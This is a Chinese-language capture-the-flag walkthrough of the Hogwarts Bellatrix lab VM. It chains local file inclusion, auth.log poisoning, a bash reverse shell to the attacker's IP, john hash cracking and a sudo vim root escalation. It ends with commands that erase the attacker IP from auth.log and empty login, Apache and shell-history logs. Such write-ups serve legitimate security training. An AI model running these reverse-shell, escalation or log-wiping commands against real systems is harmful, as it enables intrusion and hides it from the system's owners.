# 前言

靶机：`hotwarts-dobby`，ip地址为`192.168.1.69`

攻击：`kali`，ip地址为`192.168.1.16`

都采用虚拟机，网卡为桥接模式

# 主机发现

使用`arp-scan -l`或`netdiscover -r 192.168.1.1/24`扫描发现主机

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\1.jpg)

# 信息收集

## 使用nmap扫描端口

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\2.jpg)

## 网站信息探测

访问80端口，发现界面显示一串字符，观察其规律，最后有`.php`，可能是一个文件

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\3.jpg)

查看页面源代码，可以看到给出几个信息点，其中一句话中大概意思是，这次在源代码界面中没有东西，或许我已经告诉你一个目录，`.php`文件

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\4.jpg)

最终去重后，发现为一个`php`文件`ikilledsiriusblack.php`

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\5.jpg)

# 漏洞寻找

根据前面的页面源代码查询中，发现有一个文件包含，参数为`file`，那么测试是否可行，尝试包含文件`/etc/passwd`，发现可以，并发现一个用户`lestrange`，只是，其采用的是`rbash`

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\6.jpg)

测试发现，只是本地文件包含，并且`/etc/shadow`无权限

再次尝试对网站进行目录爆破，不过并没有东西产出

那么尝试使用`ffuf`配合`linux`的一些关键目录文件进行测试，观察有哪些可以访问

```shell
ffuf -c -w /usr/share/wordlists/linux_file.txt -u http://192.168.1.69/ikilledsiriusblack.php?file=FUZZ -fs 1728,0 
# -fs是过滤一些特定字节的网页，1728是其网站的默认字节
#这里的字典可以去github上下载一个
```

发现日志文件`auth.log`可以访问，尝试进行污染，因为该文件中在进行`ssh`身份认证时，会记录用户名及相关信息，所需要做的就是把用户名改成一段`php`代码

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\7.jpg)

# 漏洞利用

然后尝试进行代码注入

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\8.jpg)

这时候大概率已经注入成功，可以进行查看，一般都是在文件的最后位置，结合前面的信息，一般登录失败会把用户也显示，但是php作为脚本语言，并不会直接显示，判定，已经成功，记录在文件中了

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\9.jpg)

那么尝试利用注入的代码，注入的代码可用

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\10.jpg)

# 反弹shell

尝试进行一个bash反弹，获取终端

```shell
/bin/bash-c 'bash -i >& /dev/tcp/192.168.1.16/1234 >&1'
#这里最好对该语句进行URL编码处理
```

先在`kali`中使用`nc`开启一个监听，浏览器执行上面的语句后就会在`kali`中反弹成功

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\11.jpg)

然后习惯性的查看当前目录下的文件，意外发现一个`root`所有者的目录，并且还可以查看，而且还是进行编码处理的名称

解码发现名称是`secret`，那就值得关注，进入到该目录，发现一个文件，查看后，发现是用户`lestrange`的hash

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\12.jpg)

# 提权

## 水平提权至lestrange

那就简单了，这里可以直接进行hash破解，不过这里还是复习一下`unshadow`的使用，查看`/etc/passwd`中的`lestrange`，然后复制到`kali`中的一个文件，并把上面的hash也都复制到一个文件，使用`unshadow`整合在一起后，使用`john`爆破

这里需要注意，在查看目录是尽量使用`ls -al`，因为我这里就是因为使用`kali`中的字典进行爆破，但是长时间没效果，然后再次寻找的时候，发现提供了一个字典

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\13.jpg)

复制该文件的内容，或者下载，怎么都行，只要把内容复制到`kali`中，然后使用`john`破解，发现密码`ihateharrypotter`

```shell
#复制文件/etc/passwd内容到kali中的user文件
#复制文件Swordofgryffindor内容到kali中的pass文件
#复制文件字典.sercret.dic内容到kali中的word.txt文件
#使用unshadow整合两个文件到userpass
unshadow user pass > userpass
john userpass --wordlist=word.txt 
```

这里图片中出现两次`john`是显示问题

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\14.jpg)

使用用户名`lestrange`和密码`ihateharrypotter`登录`ssh`

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\15.jpg)

查看当前目录下的文件，发现`.bash_history`，查看其内容

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\16.jpg)

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\17.jpg)

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\18.jpg)

## 垂直提权至root

根据上面的历史命令记录，可能存在`sudo`提权，所以就不再使用`find`寻找具有SUID权限文件，直接`sudo -l`

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\19.jpg)

发现`vim`，并且对应之前命令历史记录中的语句，可以直接使用，或者查看网站`gtfobins.github.io`中的方式

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\20.jpg)

使用命令`sudo vim -c ':!/bin/sh'`提权，成功至`root`

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\21.jpg)

并且有个`script.sh`脚本，查看发现原来是更改`auth.log`权限的

![](D:\stu\vulnhub\Hogwarts靶场\pic-bellatrix\22.jpg)

# 清理痕迹

日志清理，因为这次主要就是`auth.log`日志文件，所以要好好清理

```shell
sed -i "/192.168.1.16/d" /var/log/auth.log
echo > /var/log/btmp
echo > /var/log/faillog
echo > /var/log/lastlog
echo > /var/log/wtmp
echo > /var/log/apache2/access.log
echo > /var/log/apache2/error.log
```

历史命令记录

```shell
history -r 
history -c
```

# 总结

该靶场考察以下几点：

1. 对于文件的发现，发现到的都要测试一下
2. php语言的文件包含，此处使用的是`include`，包含时，会执行其文件
3. 对于`linux`中的一些文件如何配合文件包含，这里就是身份认证日志文件`auth.log`，因为用户名是可控的，所以传入了脚本语言，导致造成危害
4. 对于常见的提权，可以通过查看命令历史记录寻找其中可利用的点，或者利用`suid`或者`sudo`等提权









